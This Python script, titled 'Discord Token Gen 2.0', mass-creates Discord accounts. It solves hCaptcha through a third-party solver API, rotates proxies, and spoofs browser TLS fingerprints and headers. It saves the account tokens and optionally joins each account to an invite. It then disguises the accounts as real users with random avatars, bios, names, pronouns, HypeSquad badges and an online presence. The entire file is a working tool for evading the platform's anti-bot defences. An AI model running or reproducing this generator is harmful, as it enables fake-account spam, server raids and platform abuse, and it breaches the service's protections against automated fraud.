from threading import Lock , Thread , Timer
from datetime import datetime
from colorama import Fore, init
from pystyle import Write, System, Colors, Colorate, Anime
import httpx
import json
import random
import logging
from time import time, sleep
import base64
import os
from os.path import isfile, join
import ctypes , sys
import websocket
import tls_client
import httpx

try:
    buildNumber = int(httpx.get("https://raw.githubusercontent.com/EffeDiscord/discord-api/main/fetch").json()['client_build_number']) 
except Exception:
    buildNumber = 218604 

useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
try:
    os.system('cls' if os.name == 'nt' else 'clear')
except Exception:
    pass

genned , errors , solved , unlocked , locked = 0 , 0 , 0 , 0 , 0
genStartTime = time()
Author = ""

class Title:
    def __init__(self):
        self.lock = Lock()
        self.update_title()

    def update_title(self):
            try:
                unlock_rate = round(unlocked / (genned + 1) * 100, 2)
                title = f'Generator: {genned} Unlocked: {unlocked} {round(time() - genStartTime, 2)}s |'
                os_to_avoid = ['linux', 'darwin']
                if sys.platform not in os_to_avoid:
                    ctypes.windll.kernel32.SetConsoleTitleW(title)
            except Exception as e:
                print(e)
                pass
            
            Timer(0.1, self.update_title).start()

logging.getLogger("httpx").setLevel(logging.ERROR)
config = json.load(open('./data/config.json', 'r', encoding='utf-8'))
used_usernames = []
total_usernames = len(open('data/usernames.txt', encoding='utf-8').read().splitlines())
try:
    bios = open('data/bios.txt', encoding='utf-8').read().splitlines()
except FileNotFoundError:
    bios = []

proxies = open('data/proxies.txt', encoding='utf-8').read().splitlines()

try:
    _capsolver = config['ApiKey']
    _debug = config['Debug'] if config['Debug'] else False
    _invite = config['Invite'] if config['Invite'] else None
    _humanization = config['Humanization'] if config['Humanization'] else False
    _pfp = _humanization['pfp'] if _humanization['pfp'] else False
    _bio = _humanization['bio'] if _humanization['bio'] else False
    _displayName = _humanization['displayName'] if _humanization['displayName'] else False
    _pronouns = _humanization['pronouns'] if _humanization['pronouns'] else False
    _birthday = _humanization['birthday'] if _humanization['birthday'] else False
    _hypesquad = _humanization['Hypesquad'] if _humanization['Hypesquad'] else False
except KeyError:
    print('Error: Config file is missing some values.')
    exit()

init()


class Log:
    """
    A class to log messages to the console.
    
    """
    lock = Lock()
    log_file = None 
    @staticmethod
    def set_log_file(filename):
        Log.log_file = open(filename, 'a')

    @staticmethod
    def _log(level, prefix, message):
        timestamp = datetime.fromtimestamp(time()).strftime("%H:%M:%S")
        log_message = f"[{Fore.LIGHTBLACK_EX}{timestamp}{Fore.RESET}] {prefix} {message}"

        with Log.lock:
            if Log.log_file:
                Log.log_file.write(log_message + '\n')
                Log.log_file.flush()
            print(log_message)

    @staticmethod
    def Success(message, prefix="(+)", color=Fore.GREEN):
        Log._log("SUCCESS", f"{color}{prefix}{Fore.RESET}", message)

    @staticmethod
    def Error(message, prefix="(-)", color=Fore.RED):
        Log._log("ERROR", f"{color}{prefix}{Fore.RESET}", message)

    @staticmethod
    def Debug(message, prefix="(*)", color=Fore.RED):
        Log._log("DEBUG", f"{color}{prefix}{Fore.RESET}", message)

    @staticmethod
    def Solved(message, prefix="(!)", color=Fore.YELLOW):
        Log._log("SOLVED", f"{color}{prefix}{Fore.RESET}", message)

    @staticmethod
    def Info(message, prefix="(?)" , color=Fore.YELLOW):
        Log._log("INFO", f"{color}{prefix}{Fore.RESET}", message)

    @staticmethod
    def Warning(message, prefix="(!)", color=Fore.RED):
        Log._log("WARNING", f"{color}{prefix}{Fore.RESET}", message)


class Solver:
    """
    A class to solve captchas using the CapSolver API.

    """

    @staticmethod
    def SolveCaptcha(sitekey, url, useragent, proxy):
        start = time()
        try:
            while True:
                try:
                    taskId = httpx.post("https://api.capsolver.com/createTask", json={
                        "clientKey": config["ApiKey"],
                        "task": {
                            "type": "HCaptchaTurboTask",
                            "websiteURL": url,
                            "websiteKey": sitekey,
                            "proxy": f"http://{proxy}",
                            "enableIPV6": False,
                            "useragent": useragent
                        }}).json()
                    break
                except:
                    continue


            while True:
                try:
                    result = httpx.post("https://api.capsolver.com/getTaskResult", json={
                        "clientKey": config["ApiKey"],
                        "taskId": taskId["taskId"]
                    }).json()

                    if result["status"] == "processing":
                        sleep(1.5)
                        continue

                    elif result["status"] == "ready":
                        answer = result["solution"]["gRecaptchaResponse"]
                        Log.Solved(f"Solved : {round(time() - start, 2)}s | Solution : {answer[:50]}....")
                        return answer

                    elif result["status"] == "failed":
                        Log.Error(f"Failed to Solve Captcha: {result['errorDescription']}")
                        return None

                    else:
                        return None
                except:
                    continue

        except httpx.HTTPError as http_err:
            Log.Error(f"HTTP error occurred: {http_err}")
            

        except Exception as err:
            Log.Error(f"An error occurred: {err}")
            return None

class Utils:
    @staticmethod
    def GetUsername():
        with open('data/usernames.txt', encoding='utf-8') as file:
            usernames = file.read().splitlines()
        available_usernames = [username for username in usernames if username not in used_usernames]
        if len(used_usernames) == total_usernames:
            used_usernames.clear()
        if not available_usernames:
            used_usernames.clear()
            available_usernames = usernames
        username = random.choice(available_usernames)
        used_usernames.append(username)
        return username
    

    @staticmethod
    def GetSuperProperties():
        return base64.b64encode(json.dumps({"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Safari/537.36","browser_version":"110.0.5481.192","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":buildNumber,"client_event_source":None}).encode()).decode()
    

    @staticmethod
    def GetFormattedProxy(filename):
        proxy = random.choice(open(filename, encoding="cp437").read().splitlines()).strip()
        if '@' in proxy:
            return proxy
        elif len(proxy.split(':')) == 2:
            return proxy
        else:
            if '.' in proxy.split(':')[0]:
                return ':'.join(proxy.split(':')[2:]) + '@' + ':'.join(proxy.split(':')[:2])
            else:
                return ':'.join(proxy.split(':')[:2]) + '@' + ':'.join(proxy.split(':')[2:])
            
    
    @staticmethod
    def GetBirth():
        return f'{random.randint(1990, 2000)}-{random.randint(1, 12)}-{random.randint(1, 28)}'
    

    @staticmethod
    def GetPronouns():
        pronouns = ["he/him", "she/her","they/them","Switched/On" , "Ask me","it/its","Cool/Hot"]
        return random.choice(pronouns)
    

    @staticmethod
    def GetBio():
        if len(bios) == 0:
            return 'Switched On'
        
        while True:
            bio = random.choice(bios)
            if len(bio) != 0:
                return bio
            else:
                continue
    
    @staticmethod
    def GetAvatar():
        picture = [f for f in os.listdir("data/avatars/") if isfile(join("data/avatars/", f))]
        random_picture = random.choice(picture)
        with open(f'data/avatars/{random_picture}', "rb") as image_file:
            encoded_string = base64.b64encode(image_file.read())
        return encoded_string.decode('utf-8')

class Cookie:
    def __init__(self, proxy, session):
        self.user_agent = useragent
        self.proxy = proxy
        self.session = session
        self.headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US",
            "Alt-Used": "discord.com",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "discord.com",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "TE": "trailers",
            "User-Agent": self.user_agent,
            "X-Track": Utils.GetSuperProperties()
        }

    def get_cookies(self):
        while True:
            try:
                response = self.session.get("https://discord.com", headers=self.headers, proxy=f"http://{self.proxy}")
                __cfruid = response.cookies.get('__cfruid')
                __dcfduid = response.cookies.get('__dcfduid') 
                __sdcfduid  = response.cookies.get('__sdcfduid')
                # apis_ = ['https://discord.com/api/v9/experiments','https://canary.discord.com/api/v9/experiments' , 'https://ptb.discord.com/api/v9/experiments']
                fingerprint = self.session.get("https://discord.com/api/v9/experiments", headers=self.headers, proxy=f"http://{self.proxy}").json().get('fingerprint')
                return (__dcfduid, __sdcfduid, __cfruid, fingerprint)
            except Exception as e:
                continue
        

        
def online(token, proxy):
    try:
        proxytest = f"http://{proxy}"
        proxyweb = str(proxytest.split("http://")[1]).split("@")
        username, password, host, port = proxyweb[0].split(":")[0], proxyweb[0].split(":")[1], proxyweb[1].split(":")[0], proxyweb[1].split(":")[1]
        ws = websocket.WebSocket()
        ws.connect('wss://gateway.discord.gg/?v=9&encoding=json',http_proxy_host=host,http_proxy_port=str(port),proxy_type="http",http_proxy_auth=(username,password))        
        hello = json.loads(ws.recv())
        versionb = useragent.split("Chrome/")[1].split(" ")[0]
        auth = {
                "op": 2,
                "d": {
                    "token": token,
                    "capabilities": 125,
                    "properties":{
                        "os":"Windows",
                        "browser":"Chrome",
                        "device":"",
                        "system_locale":"en-US",
                        "browser_user_agent":useragent,
                        "browser_version":versionb,
                        "os_version":"10",
                        "referrer":"",
                        "referring_domain":"",
                        "referrer_current":"",
                        "referring_domain_current":"",
                        "release_channel":"stable",
                        "client_build_number":buildNumber,
                        "client_event_source":None
                    },
                    "compress": False,
                    "client_state": {
                        "guild_hashes": {},
                        "highest_last_message_id": "0",
                        "read_state_version": 0,
                        "user_guild_settings_version": -1,
                        "user_settings_version": -1
                    }
                }
            }
        ws.send(json.dumps(auth))

    except:
        pass

class Generator:
    def Generate(invite):
        global  genned , errors , solved , locked , unlocked
        try:
            session = tls_client.Session(client_identifier="chrome112", random_tls_extension_order=True)
            proxy = Utils.GetFormattedProxy("./data/proxies.txt")
            properties = Utils.GetSuperProperties()
            cook = Cookie(proxy, session)
            data = cook.get_cookies()
            headers = {'authority': 'discord.com','accept': '*/*','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','cookie': f'__dcfduid={data[0]}; __sdcfduid={data[1]}; __cfruid={data[2]}; locale=en-US;','origin': 'https://discord.com','referer': 'https://discord.com/register','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': useragent,'x-debug-options': 'bugReporterEnabled','x-discord-locale': 'en-US','x-fingerprint': data[3],'x-super-properties': properties}
            try:
                answer = Solver.SolveCaptcha("4c672d35-0701-42b2-88c3-78380b0db560", "https://discord.com/", useragent, proxy)
            except:
                Log.Error(f"Failed to solve captcha ...")
                return
            
            if answer == None:
                Log.Error(f"Failed to solve captcha ...")
                return
            

            if _invite == None or _invite == "":
                payload = {"consent": True,"fingerprint": data[3], "username": Utils.GetUsername(),"captcha_key": answer}
            else:
                payload = {"consent": True,"fingerprint": data[3], "username": Utils.GetUsername(),"captcha_key": answer,"invite":_invite}
            
            while True:
                try:
                    r = session.post('https://discord.com/api/v9/auth/register', headers=headers, json=payload, proxy=f"http://{proxy}")
                    break
                except:
                    continue
                
            if r.status_code == 201:  
                token = r.json()["token"]
                try:
                    online(token, proxy)
                except:
                    pass
                genned += 1
                with open("./output/tokens.txt", "a") as f:
                    f.write(f"{token}\n")
                    
                newheaders = {'authority': 'discord.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'cookie': f'__dcfduid={data[0]}; __sdcfduid={data[1]}; __cfruid={data[2]};', 'authorization': token, 'origin': 'https://discord.com', 'referer': 'https://discord.com/@me', 'Content-Type': 'application/json', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': useragent, 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US', 'x-fingerprint': data[3], 'x-super-properties': properties}
                while True:
                    try:
                        r = session.get("https://discord.com/api/v9/users/@me/affinities/users", headers=newheaders, proxy=f"http://{proxy}")
                        break
                    except:
                        continue

                
                if r.status_code == 200:
                    Log.Success(f'Unlocked | {token[:50]}....')
                    try:
                        online(token, proxy)
                    except:
                        pass
                    unlocked += 1
                    with open("./output/unlocked.txt", "a") as f:
                        f.write(f"{token}\n")

                    if _pfp == True: # Apply Profile Picture  if _pfp is True
                        sleep(2)
                        Switchpfp = Utils.GetAvatar()
                        headers = {
                                "authority": "discord.com",
                                "accept": "*/*",
                                "accept-language": 'en-US,en;q=0.9',
                                "authorization": token,
                                "content-type": "application/json",
                                "cookie": f'__dcfduid={data[0]}; __sdcfduid={data[1]}; __cfruid={data[2]}; locale=en-US;',
                                "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="108"',
                                "sec-ch-ua-mobile": "?1",
                                "sec-ch-ua-platform": '"Android"',
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "same-origin",
                                "user-agent": useragent,
                                "x-debug-options": "bugReporterEnabled",
                                "x-discord-locale": "en-US",
                                "x-discord-timezone": "America/Halifax",
                                "x-super-properties": properties
                            }
                        Switchdata = {
                                "avatar": f"data:image/jpeg;base64,{Switchpfp}"
                            }
                        while True:
                            try:
                                r = session.patch("https://discord.com/api/v9/users/@me", headers=headers, json=Switchdata, proxy=f"http://{proxy}")
                                break
                            except:
                                sleep(2)
                                continue
                        if r.status_code == 200:
                            Log.Success(f"Added Profile Picture | {token[:50]}....")
                        
                        else:
                            Log.Error(f"Failed to add Profile Picture | {token[:50]}....")
                            pass

                        
                    if _bio == True:
                        sleep(3)
                        SwitchBio = Utils.GetBio()
                        url = 'https://discord.com/api/v9/users/@me/profile'
                        Switchdata = {"bio": str(SwitchBio)}
                        headers = {
                            'authority': 'discord.com',
                            'method': 'PATCH',
                            'path': '/api/v9/users/@me/profile',
                            'scheme': 'https',
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US',
                            'authorization': token,
                            'content-type': 'application/json',
                            'cookie': f'__dcfduid={data[0]}; __sdcfduid={data[1]}; __cfruid={data[2]}; locale=en-US;',
                            'origin': 'https://discord.com',
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': useragent,
                            'x-debug-options': 'bugReporterEnabled',
                            'x-discord-locale': 'en-US',
                            'x-discord-timezone': 'America/Halifax',
                            'x-super-properties': properties
                        }
                        
                        while True:
                            try:
                                r = session.patch(url, headers=headers, json=Switchdata, proxy=f"http://{proxy}")
                                break
                            except:
                                continue
                            #200 = OK

                        if r.status_code == 200: 
                            Log.Success(f"Added Bio | {token[:50]}....")
                        
                        else:
                            Log.Error(f"Failed to add Bio | {token[:50]}....")
                            return
                    
                    if _displayName== True:
                        url = 'https://discord.com/api/v9/users/@me'
                        headers = {
                            'authority': 'discord.com',
                            'method': 'PATCH',
                            'path': '/api/v9/users/@me',
                            'scheme': 'https',
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US',
                            'authorization': token,
                            'content-type': 'application/json',
                            'cookie': f'__dcfduid={data[0]}; __sdcfduid={data[1]}; __cfruid={data[2]}; locale=en-US;',
                            'origin': 'https://discord.com',
                            'referer': 'https://discord.com/channels/@me/',
                            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': useragent,
                            'x-debug-options': 'bugReporterEnabled',
                            'x-discord-locale': 'en-US',
                            'x-discord-timezone': 'America/Halifax',
                            'x-super-properties': properties
                        }

                        Switchdata = {"global_name": Utils.GetUsername()}
                        while True:
                            try:
                                r = session.patch(url, headers=headers, json=Switchdata, proxy=f"http://{proxy}")
                                break
                            except:
                                continue
                            #200 = OK

                        if r.status_code == 200:
                            Log.Success(f"Added Display User | {token[:50]}....")
                        
                        else:
                            Log.Error(f"Failed to add Display User | {token[:50]}....")
                            return
                        
                    if _pronouns== True:
                        sleep(1)
                        url  = 'https://discord.com/api/v9/users/@me/profile'
                        headers = {
                            'authority': 'discord.com',
                            'method': 'PATCH',
                            'path': '/api/v9/users/@me/profile',
                            'scheme': 'https',
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US',
                            'authorization': token,
                            'content-type': 'application/json',
                            'cookie': f'__dcfduid={data[0]}; __sdcfduid={data[1]}; __cfruid={data[2]}; locale=en-US;',
                            'origin': 'https://discord.com',
                            'referer': 'https://discord.com/channels/@me/',
                            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': useragent,
                            'x-debug-options': 'bugReporterEnabled',
                            'x-discord-locale': 'en-US',
                            'x-discord-timezone': 'America/Halifax',
                            'x-super-properties': properties
                        }
                        Switchdata ={"pronouns":str(Utils.GetPronouns())}
                        while True:
                            try:
                                r = session.patch(url, headers=headers, json=Switchdata, proxy=f"http://{proxy}")
                                break
                            except:
                                continue
                            #200 = OK
                        
                        if r.status_code == 200:
                            Log.Success(f"Added Pronouns | {token[:50]}....")
                        else:
                            Log.Error(f"Failed to add Pronouns | {token[:50]}....")
                            return 

                    if _birthday== True:
                            pass # will add later

                    if _hypesquad== True:
                        url = 'https://discord.com/api/v9/hypesquad/online'
                        headers = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/hypesquad/online',
                            'scheme': 'https',
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US',
                            'authorization': token,
                            'content-type': 'application/json',
                            'cookie': f'__dcfduid={data[0]}; __sdcfduid={data[1]}; __cfruid={data[2]}; locale=en-US;',
                            'origin': 'https://discord.com',
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': useragent,
                            'x-debug-options': 'bugReporterEnabled',
                            'x-discord-locale': 'en-US',
                            'x-discord-timezone': 'America/Halifax',
                            'x-super-properties': properties
                        }
                        house_ = random.choice([1,2,3])
                        Switchdata = {"house_id":house_}
                        while True:
                            try:
                                r = session.post(url, headers=headers, json=Switchdata, proxy=f"http://{proxy}")
                                break
                            except:
                                continue
                            #200 = OK
                        
                        if r.status_code == 204:
                            Log.Success(f"Added Hypesquad | {token[:50]}....")
                        else:
                            Log.Error(f"Failed to add Hypesquad | {token[:50]}.... | {r.text}")
                            return
                    


                    with open("./output/humanized.txt", "a") as f:
                        f.write(f"{token}\n")
                    

                else:
                    locked += 1
                    Log.Error(f"Locked | {token[:50]}....")
                    with open("./output/locked.txt", "a") as f:
                        f.write(f"{token}\n")
        
        except Exception as e:
            errors += 1
            Log.Error(f"Error: {e}  ")
            return



def generate():
    global genned , errors , solved , locked , unlocked
    while True:
        try:
            Generator.Generate(_invite)
        except Exception as e:
            errors += 1
            Log.Error(f"Error: {e}  ")
            continue


if __name__ == "__main__":
    title =  Title()
    title.update_title()
    os.system('cls' if os.name == 'nt' else 'clear')
    input(Fore.CYAN + "Discord Token Gen 2.0 pls Enter")
    sleep(2)
    os.system("cls")
    threads = int(input(Fore.YELLOW + "(?)Thread: " + Fore.RESET))
    for i in range(threads):
        Thread(target=generate).start()
